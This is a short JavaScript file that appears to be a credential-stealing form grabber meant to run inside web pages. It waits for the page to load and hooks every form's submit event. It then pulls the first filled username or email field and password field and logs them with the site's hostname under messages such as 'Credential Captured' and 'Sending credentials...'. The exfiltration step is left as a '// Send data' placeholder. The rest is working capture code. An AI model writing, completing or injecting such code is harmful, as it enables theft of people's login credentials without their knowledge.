const DEBUG = true;

function getCreds() {
    if (DEBUG) {
        console.log("[*] Looking for credentials...");
    }

    // Set an interval to check repeatedly if the webpage has finished loading.
    const readyStateCheckInterval = setInterval(function() {
        // Check if the document's loading process is complete.
        if (document.readyState === "complete") {
            // If the page is loaded, stop the repeated checks.
            clearInterval(readyStateCheckInterval);

            // This function finds the username and password and prints them to the console.
            const logCapturedCredentials = function() {
                const passwordBoxes = document.querySelectorAll("input[type=password]");
                const textInputs = document.querySelectorAll("input[type=text], input[type=email]"); // Also check for email fields
                let username = "";
                let password = "";

                // Convert NodeList to an Array to check for inclusion.
                const passwordBoxesArray = Array.from(passwordBoxes);

                // Find the first text or email input that is not a password box and has a value.
                for (const input of textInputs) {
                    if (!passwordBoxesArray.includes(input) && input.value) {
                        username = input.value;
                        break;
                    }
                }

                // Get the value from the first password field that has a value.
                for (const pbox of passwordBoxes) {
                    if (pbox.value) {
                        password = pbox.value;
                        break;
                    }
                }

                // Print results
                if (password) {
                    if (DEBUG) {
                        console.log("[+] Credential Captured");
                        console.log("[>] Username: ", username || "(not found)");
                        console.log("[>] Password: ", password);
                        console.log("[>] Domain: ", window.location.hostname);
                        console.log("[*] Sending credentials...");
                    }
                    // Send data
                }
            };

            // This function runs when a form is about to be submitted.
            const formSubmitHandler = function(event) {
                // Log the credentials to the console before the form is submitted.
                logCapturedCredentials();
            };

            // Find all forms on the page and attach our handler.
            const allForms = document.querySelectorAll("form");
            allForms.forEach(form => {
                // Use the 'submit' event to ensure we capture data just before submission.
                form.addEventListener("submit", formSubmitHandler);
            });

        }
    }, 100); // Check every 100 milliseconds.
}

getCreds();
